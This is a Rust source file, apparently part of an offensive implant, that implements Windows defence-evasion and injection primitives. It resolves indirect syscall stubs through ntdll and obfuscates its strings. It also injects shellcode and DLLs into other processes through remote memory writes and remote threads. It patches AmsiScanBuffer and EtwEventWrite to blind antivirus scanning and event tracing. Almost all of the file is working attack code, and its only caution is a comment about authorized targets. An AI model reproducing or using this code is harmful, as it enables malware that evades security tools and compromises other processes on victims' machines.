//! Windows anti-analysis primitives: indirect syscalls plus AMSI and ETW
//! userland patching.
//!
//! The implementation is clean-room, based on publicly documented techniques
//! (PEB module walking, ntdll syscall stub parsing, prologue patching). No
//! external function imports are used for the sensitive operations: stubs are
//! generated into executable memory and jump through the `syscall; ret` gadget
//! inside ntdll itself.

#![allow(unsafe_code)]

use crate::pe;
use crate::stubs;
use shikra_obf::obf;
use std::collections::HashMap;
use std::sync::OnceLock;
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};

const STUB_LEN: usize = 21;

/// A resolved ntdll syscall: service number plus the stub address it was read
/// from. `gadget` is the `syscall; ret` instruction the generated stub jumps
/// to.
#[derive(Debug, Clone, Copy)]
pub struct Syscall {
    pub ssn: u32,
    pub address: usize,
    pub gadget: usize,
}

/// Locates `ntdll.dll` through the PEB loader list, avoiding `GetModuleHandleA`.
pub fn ntdll_base() -> Option<usize> {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        let peb: usize;
        core::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, preserves_flags, readonly)
        );
        if peb == 0 {
            return None;
        }
        let ldr = read_ptr(peb + 0x18)?;
        let mut entry = read_ptr(ldr + 0x20)?;
        let head = entry;
        loop {
            // `entry` points at the InMemoryOrderLinks field, so the module
            // fields are offset by -0x10 from their struct positions.
            let dll_base = read_ptr(entry + 0x20)?;
            let name_len = read_u16(entry + 0x48)? as usize;
            let name_buf = read_ptr(entry + 0x50)?;
            if (2..=520).contains(&name_len) {
                let chars = core::slice::from_raw_parts(name_buf as *const u16, name_len / 2);
                if pe::utf16_eq_ascii(chars, &obf!("ntdll.dll")) {
                    return Some(dll_base);
                }
            }
            entry = read_ptr(entry)?;
            if entry == head {
                return None;
            }
        }
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        None
    }
}

/// Resolves a syscall by export name, extracting the SSN from the prologue.
pub fn resolve(name: &str) -> Option<Syscall> {
    let base = ntdll_base()?;
    let header = unsafe { core::slice::from_raw_parts(base as *const u8, 0x1000) };
    let size = pe::image_size(header)?;
    let image = unsafe { core::slice::from_raw_parts(base as *const u8, size) };
    let rva = pe::find_export_rva(image, name)?;
    let address = base.checked_add(rva as usize)?;
    let stub = unsafe { core::slice::from_raw_parts(address as *const u8, 32) };
    let ssn = stubs::extract_ssn_x64(stub)?;
    let gadget = find_gadget(image, base, address)?;
    Some(Syscall {
        ssn,
        address,
        gadget,
    })
}

fn find_gadget(image: &[u8], base: usize, stub: usize) -> Option<usize> {
    let prologue = unsafe { core::slice::from_raw_parts(stub as *const u8, 32) };
    if let Some(offset) = stubs::find_syscall_gadget(prologue) {
        return Some(stub + offset);
    }
    for (start, len) in pe::exec_ranges(image) {
        if let Some(section) = image.get(start..start + len) {
            if let Some(offset) = stubs::find_syscall_gadget(section) {
                return Some(base + start + offset);
            }
        }
    }
    None
}

/// Executable stubs built once per process.
struct StubTable {
    stubs: HashMap<String, usize>,
}

static STUBS: OnceLock<Result<StubTable, String>> = OnceLock::new();

fn wanted() -> [String; 11] {
    [
        obf!("NtProtectVirtualMemory"),
        obf!("NtAllocateVirtualMemory"),
        obf!("NtWriteVirtualMemory"),
        obf!("NtReadVirtualMemory"),
        obf!("NtOpenProcess"),
        obf!("NtCreateThreadEx"),
        obf!("NtTerminateProcess"),
        obf!("NtSuspendThread"),
        obf!("NtClose"),
        obf!("NtDelayExecution"),
        obf!("LdrLoadDll"),
    ]
}

fn stub_table() -> Result<&'static StubTable, String> {
    STUBS
        .get_or_init(|| unsafe { build_stubs() })
        .as_ref()
        .map_err(|err| err.clone())
}

unsafe fn build_stubs() -> Result<StubTable, String> {
    if ntdll_base().is_none() {
        return Err("ntdll not reachable".into());
    }
    let mut resolved: Vec<(String, Syscall)> = Vec::new();
    for name in wanted() {
        match resolve(&name) {
            Some(call) => resolved.push((name, call)),
            None => tracing::debug!(syscall = %name, "syscall not resolvable"),
        }
    }
    if resolved.is_empty() {
        return Err("no syscalls resolvable (hooked ntdll?)".into());
    }
    let page_size = 4096usize;
    let page = VirtualAlloc(
        core::ptr::null(),
        page_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if page.is_null() {
        return Err("stub allocation failed".into());
    }
    let mut offset = 0usize;
    let mut stubs = HashMap::new();
    for (name, call) in &resolved {
        if offset + STUB_LEN > page_size {
            return Err("stub page exhausted".into());
        }
        let target = write_stub((page as *mut u8).add(offset), call);
        stubs.insert(name.clone(), target);
        offset += STUB_LEN;
    }
    let mut old = 0u32;
    if VirtualProtect(page, page_size, PAGE_EXECUTE_READ, &mut old) == 0 {
        return Err("failed to make stub page executable".into());
    }
    Ok(StubTable { stubs })
}

unsafe fn write_stub(target: *mut u8, call: &Syscall) -> usize {
    let mut code = Vec::with_capacity(STUB_LEN);
    code.extend_from_slice(&[0x49, 0xBB]); // mov r11, imm64
    code.extend_from_slice(&(call.gadget as u64).to_le_bytes());
    code.extend_from_slice(&[0x4C, 0x8B, 0xD1]); // mov r10, rcx
    code.push(0xB8); // mov eax, imm32
    code.extend_from_slice(&call.ssn.to_le_bytes());
    code.extend_from_slice(&[0x41, 0xFF, 0xE3]); // jmp r11
    debug_assert_eq!(code.len(), STUB_LEN);
    core::ptr::copy_nonoverlapping(code.as_ptr(), target, code.len());
    target as usize
}

/// Returns the executable stub for a syscall name, building the table lazily.
pub fn stub(name: &str) -> Result<usize, String> {
    stub_table()?
        .stubs
        .get(name)
        .copied()
        .ok_or_else(|| format!("{name} stub unavailable"))
}

/// Looks up a syscall stub by its unobfuscated name.
pub fn stub_by_name(name: &str) -> Result<usize, String> {
    stub(name)
}

type NtProtectVirtualMemoryFn =
    unsafe extern "system" fn(usize, *mut usize, *mut usize, u32, *mut u32) -> i32;
type NtAllocateVirtualMemoryFn =
    unsafe extern "system" fn(usize, *mut usize, usize, *mut usize, u32, u32) -> i32;
type NtWriteVirtualMemoryFn =
    unsafe extern "system" fn(usize, usize, *const u8, usize, *mut usize) -> i32;

/// Flips page protection using an indirect `NtProtectVirtualMemory` call.
///
/// # Safety
///
/// `address` must be a valid mapped address in the current process.
pub unsafe fn protect(address: usize, size: usize, new_protect: u32) -> Result<u32, String> {
    let entry: NtProtectVirtualMemoryFn =
        core::mem::transmute(stub(&obf!("NtProtectVirtualMemory"))?);
    let mut base = address;
    let mut region = size;
    let mut old_protect = 0u32;
    let status = entry(
        usize::MAX,
        &mut base,
        &mut region,
        new_protect,
        &mut old_protect,
    );
    if status < 0 {
        return Err(format!(
            "{} failed: {status:#x}",
            obf!("NtProtectVirtualMemory")
        ));
    }
    Ok(old_protect)
}

/// Writes `bytes` at `address` via `NtWriteVirtualMemory`, temporarily making
/// the target writable and restoring the original protection afterwards.
///
/// # Safety
///
/// `address` must point at mapped memory in the current process.
pub unsafe fn write_memory(address: usize, bytes: &[u8]) -> Result<(), String> {
    let old = protect(address, bytes.len(), PAGE_EXECUTE_READWRITE)?;
    let entry: NtWriteVirtualMemoryFn = core::mem::transmute(stub(&obf!("NtWriteVirtualMemory"))?);
    let mut written = 0usize;
    let status = entry(
        usize::MAX,
        address,
        bytes.as_ptr(),
        bytes.len(),
        &mut written,
    );
    let restore = protect(address, bytes.len(), old);
    if status < 0 {
        return Err(format!(
            "{} failed: {status:#x}",
            obf!("NtWriteVirtualMemory")
        ));
    }
    if written != bytes.len() {
        return Err(format!("short write: {written}/{}", bytes.len()));
    }
    restore.map(|_| ())
}

/// Allocates committed RWX memory through an indirect syscall.
///
/// # Safety
///
/// The returned region is executable and uninitialized; callers must treat it
/// as untrusted memory and never execute it before writing valid code.
pub unsafe fn alloc_exec(size: usize) -> Result<usize, String> {
    let entry: NtAllocateVirtualMemoryFn =
        core::mem::transmute(stub(&obf!("NtAllocateVirtualMemory"))?);
    let mut base = 0usize;
    let mut region = size;
    let status = entry(usize::MAX, &mut base, 0, &mut region, 0x3000, 0x40);
    if status < 0 || base == 0 {
        return Err(format!(
            "{} failed: {status:#x}",
            obf!("NtAllocateVirtualMemory")
        ));
    }
    Ok(base)
}

type NtDelayExecutionFn = unsafe extern "system" fn(u8, *mut i64) -> i32;

/// Sleeps through an indirect `NtDelayExecution` call instead of the hooked
/// `kernel32!Sleep`/wait APIs. `millis` is relative.
pub fn syscall_sleep(millis: u64) -> Result<(), String> {
    let entry: NtDelayExecutionFn =
        unsafe { core::mem::transmute(stub(&obf!("NtDelayExecution"))?) };
    // Negative values are relative intervals in 100 ns units.
    let mut interval = -((millis as i64).saturating_mul(10_000));
    let status = unsafe { entry(0, &mut interval) };
    if status < 0 {
        return Err(format!("{} failed: {status:#x}", obf!("NtDelayExecution")));
    }
    Ok(())
}

/// `OBJECT_ATTRIBUTES` as laid out on x64 (48 bytes).
#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

impl ObjectAttributes {
    fn null() -> Self {
        Self {
            length: 48,
            root_directory: 0,
            object_name: 0,
            attributes: 0,
            security_descriptor: 0,
            security_quality_of_service: 0,
        }
    }
}

/// `CLIENT_ID` (process/thread pair).
#[repr(C)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

/// PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
/// PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION
pub const PROCESS_INJECT_ACCESS: u32 = 0x043A;

/// THREAD_ALL_ACCESS.
pub const THREAD_ALL_ACCESS: u32 = 0x1F_FFFF;

/// `NtOpenProcess` via an indirect syscall.
pub fn open_process(pid: u32, access: u32) -> Result<usize, String> {
    let entry: NtOpenProcessFn = unsafe { core::mem::transmute(stub(&obf!("NtOpenProcess"))?) };
    let mut handle = 0usize;
    let mut attributes = ObjectAttributes::null();
    let mut client_id = ClientId {
        unique_process: pid as usize,
        unique_thread: 0,
    };
    let status = unsafe { entry(&mut handle, access, &mut attributes, &mut client_id) };
    if status < 0 || handle == 0 {
        return Err(format!("{} failed: {status:#x}", obf!("NtOpenProcess")));
    }
    Ok(handle)
}

type NtOpenProcessFn =
    unsafe extern "system" fn(*mut usize, u32, *mut ObjectAttributes, *mut ClientId) -> i32;

/// Allocates memory inside a remote process.
///
/// # Safety
///
/// `process` must be a valid process handle with VM_OPERATION rights.
pub unsafe fn remote_alloc(process: usize, size: usize, protect: u32) -> Result<usize, String> {
    let entry: NtAllocateVirtualMemoryFn =
        core::mem::transmute(stub(&obf!("NtAllocateVirtualMemory"))?);
    let mut base = 0usize;
    let mut region = size;
    let status = entry(process, &mut base, 0, &mut region, 0x3000, protect);
    if status < 0 || base == 0 {
        return Err(format!(
            "{} failed: {status:#x}",
            obf!("NtAllocateVirtualMemory")
        ));
    }
    Ok(base)
}

/// Writes to a remote process.
///
/// # Safety
///
/// `process` must be a valid process handle with VM_WRITE rights and
/// `address` must be mapped in that process.
pub unsafe fn remote_write(process: usize, address: usize, bytes: &[u8]) -> Result<(), String> {
    let entry: NtWriteVirtualMemoryFn = core::mem::transmute(stub(&obf!("NtWriteVirtualMemory"))?);
    let mut written = 0usize;
    let status = entry(process, address, bytes.as_ptr(), bytes.len(), &mut written);
    if status < 0 {
        return Err(format!(
            "{} failed: {status:#x}",
            obf!("NtWriteVirtualMemory")
        ));
    }
    if written != bytes.len() {
        return Err(format!("short write: {written}/{}", bytes.len()));
    }
    Ok(())
}

/// Reads from a remote process.
///
/// # Safety
///
/// `process` must be a valid process handle with VM_READ rights.
pub unsafe fn remote_read(process: usize, address: usize, size: usize) -> Result<Vec<u8>, String> {
    let entry: NtReadVirtualMemoryFn = core::mem::transmute(stub(&obf!("NtReadVirtualMemory"))?);
    let mut buffer = vec![0u8; size];
    let mut read = 0usize;
    let status = entry(process, address, buffer.as_mut_ptr(), size, &mut read);
    if status < 0 {
        return Err(format!(
            "{} failed: {status:#x}",
            obf!("NtReadVirtualMemory")
        ));
    }
    buffer.truncate(read);
    Ok(buffer)
}

type NtReadVirtualMemoryFn =
    unsafe extern "system" fn(usize, usize, *mut u8, usize, *mut usize) -> i32;

/// Changes protection of a remote region.
///
/// # Safety
///
/// `process` must be a valid process handle with VM_OPERATION rights.
pub unsafe fn remote_protect(
    process: usize,
    address: usize,
    size: usize,
    new_protect: u32,
) -> Result<u32, String> {
    let entry: NtProtectVirtualMemoryFn =
        core::mem::transmute(stub(&obf!("NtProtectVirtualMemory"))?);
    let mut base = address;
    let mut region = size;
    let mut old_protect = 0u32;
    let status = entry(
        process,
        &mut base,
        &mut region,
        new_protect,
        &mut old_protect,
    );
    if status < 0 {
        return Err(format!(
            "{} failed: {status:#x}",
            obf!("NtProtectVirtualMemory")
        ));
    }
    Ok(old_protect)
}

/// Creates a thread in a remote process.
///
/// # Safety
///
/// `process` must be a valid process handle with CREATE_THREAD rights and
/// `start` must point at executable memory in that process.
pub unsafe fn create_remote_thread(process: usize, start: usize) -> Result<usize, String> {
    let entry: NtCreateThreadExFn = core::mem::transmute(stub(&obf!("NtCreateThreadEx"))?);
    let mut thread = 0usize;
    let status = entry(
        &mut thread,
        THREAD_ALL_ACCESS,
        0,
        process,
        start,
        0,
        0,
        0,
        0,
        0,
        0,
    );
    if status < 0 || thread == 0 {
        return Err(format!("{} failed: {status:#x}", obf!("NtCreateThreadEx")));
    }
    Ok(thread)
}

type NtCreateThreadExFn = unsafe extern "system" fn(
    *mut usize,
    u32,
    usize,
    usize,
    usize,
    usize,
    u32,
    usize,
    usize,
    usize,
    usize,
) -> i32;

/// Terminates a remote process.
///
/// # Safety
///
/// `process` must be a valid process handle with terminate rights.
pub unsafe fn terminate_process(process: usize, exit_code: u32) -> Result<(), String> {
    let entry: NtTerminateProcessFn = core::mem::transmute(stub(&obf!("NtTerminateProcess"))?);
    let status = entry(process, exit_code as i32);
    if status < 0 {
        return Err(format!(
            "{} failed: {status:#x}",
            obf!("NtTerminateProcess")
        ));
    }
    Ok(())
}

type NtTerminateProcessFn = unsafe extern "system" fn(usize, i32) -> i32;

/// Closes a kernel handle through `NtClose`.
pub fn close_handle(handle: usize) -> Result<(), String> {
    if handle == 0 || handle == usize::MAX {
        return Ok(());
    }
    let entry: NtCloseFn = unsafe { core::mem::transmute(stub(&obf!("NtClose"))?) };
    let status = unsafe { entry(handle) };
    if status < 0 {
        return Err(format!("{} failed: {status:#x}", obf!("NtClose")));
    }
    Ok(())
}

type NtCloseFn = unsafe extern "system" fn(usize) -> i32;

/// Injects `shellcode` into `pid` via indirect syscalls and returns the thread
/// handle id as a `usize` (the caller owns closing it).
///
/// # Safety
///
/// Executing arbitrary shellcode in another process is inherently unsafe; the
/// caller is responsible for using this only against authorized targets.
pub unsafe fn inject_shellcode(pid: u32, shellcode: &[u8]) -> Result<usize, String> {
    let process = open_process(pid, PROCESS_INJECT_ACCESS)?;
    let result = (|| {
        let base = remote_alloc(process, shellcode.len(), 0x04)?; // PAGE_READWRITE
        remote_write(process, base, shellcode)?;
        remote_protect(process, base, shellcode.len(), 0x20)?; // PAGE_EXECUTE_READ
        create_remote_thread(process, base)
    })();
    let _ = close_handle(process);
    result
}

/// Injects a DLL into a remote process by writing its path and starting a
/// remote `LoadLibraryW` thread (classic DLL injection; the module is loaded
/// from disk by the target).
///
/// # Safety
///
/// `pid` must reference a process this implant is allowed to open with
/// injection rights.
pub unsafe fn inject_dll(pid: u32, dll_path: &str) -> Result<usize, String> {
    let wide: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let kernel32 = load_library(&obf!("kernel32.dll"))?;
    let load_library = export_address(kernel32, &obf!("LoadLibraryW"))
        .ok_or_else(|| "LoadLibraryW export missing".to_string())?;
    let process = open_process(pid, PROCESS_INJECT_ACCESS)?;
    let result = (|| {
        let mut bytes = Vec::with_capacity(wide.len() * 2);
        for unit in &wide {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }
        let base = remote_alloc(process, bytes.len(), 0x04)?; // PAGE_READWRITE
        remote_write(process, base, &bytes)?;
        create_remote_thread(process, load_library)
    })();
    let _ = close_handle(process);
    result
}

/// Suspends a thread and returns its previous suspend count.
///
/// # Safety
///
/// `thread` must be a valid thread handle with suspend rights.
pub unsafe fn suspend_thread(thread: usize) -> Result<u32, String> {
    let entry: NtSuspendThreadFn = core::mem::transmute(stub(&obf!("NtSuspendThread"))?);
    let mut previous = 0u32;
    let status = entry(thread, &mut previous);
    if status < 0 {
        return Err(format!("{} failed: {status:#x}", obf!("NtSuspendThread")));
    }
    Ok(previous)
}

type NtSuspendThreadFn = unsafe extern "system" fn(usize, *mut u32) -> i32;

/// Patches `amsi.dll!AmsiScanBuffer` to return `E_INVALIDARG` immediately.
pub fn patch_amsi() -> Result<(), String> {
    let module = load_library(&obf!("amsi.dll"))?;
    let scan = export_address(module, &obf!("AmsiScanBuffer"))
        .ok_or_else(|| "AmsiScanBuffer export missing".to_string())?;
    unsafe {
        // mov eax, 0x80070057 (E_INVALIDARG); ret
        write_memory(scan, &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
            .map_err(|err| format!("AMSI patch failed: {err}"))
    }
}

/// Patches `ntdll!EtwEventWrite` and `EtwEventWriteFull` to return success.
pub fn patch_etw() -> Result<(), String> {
    let base = ntdll_base().ok_or_else(|| "ntdll not found".to_string())?;
    let mut patched = 0usize;
    for name in [obf!("EtwEventWrite"), obf!("EtwEventWriteFull")] {
        let Some(address) = export_address(base, &name) else {
            continue;
        };
        unsafe {
            // xor eax, eax (STATUS_SUCCESS); ret
            write_memory(address, &[0x33, 0xC0, 0xC3])
                .map_err(|err| format!("{name} patch failed: {err}"))?;
        }
        patched += 1;
    }
    if patched == 0 {
        return Err("no ETW entry point found".into());
    }
    Ok(())
}

/// Loads a module with `LdrLoadDll` through an indirect syscall.
pub fn load_library(name: &str) -> Result<usize, String> {
    let entry: LdrLoadDllFn = unsafe {
        core::mem::transmute(
            stub(&obf!("LdrLoadDll")).map_err(|err| format!("{}: {err}", obf!("LdrLoadDll")))?,
        )
    };
    let mut wide: Vec<u16> = name.encode_utf16().collect();
    let byte_len = (wide.len() * 2) as u16;
    wide.push(0);
    let mut module = 0usize;
    let mut unicode = UnicodeString {
        length: byte_len,
        maximum_length: byte_len + 2,
        buffer: wide.as_mut_ptr(),
    };
    let status = unsafe { entry(0, 0, &mut unicode, &mut module) };
    if status < 0 || module == 0 {
        return Err(format!(
            "{}({name}) failed: {status:#x}",
            obf!("LdrLoadDll")
        ));
    }
    Ok(module)
}

type LdrLoadDllFn = unsafe extern "system" fn(usize, usize, *mut UnicodeString, *mut usize) -> i32;

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

/// Resolves an export address inside an already loaded module.
pub fn export_address(module: usize, name: &str) -> Option<usize> {
    let header = unsafe { core::slice::from_raw_parts(module as *const u8, 0x1000) };
    let size = pe::image_size(header)?;
    let image = unsafe { core::slice::from_raw_parts(module as *const u8, size) };
    let rva = pe::find_export_rva(image, name)?;
    module.checked_add(rva as usize)
}

/// True when ntdll exports can be parsed in the current process.
pub fn available() -> bool {
    ntdll_base().is_some()
}

unsafe fn read_ptr(address: usize) -> Option<usize> {
    let value = (address as *const usize).read_unaligned();
    (value != 0).then_some(value)
}

unsafe fn read_u16(address: usize) -> Option<u16> {
    Some((address as *const u16).read_unaligned())
}
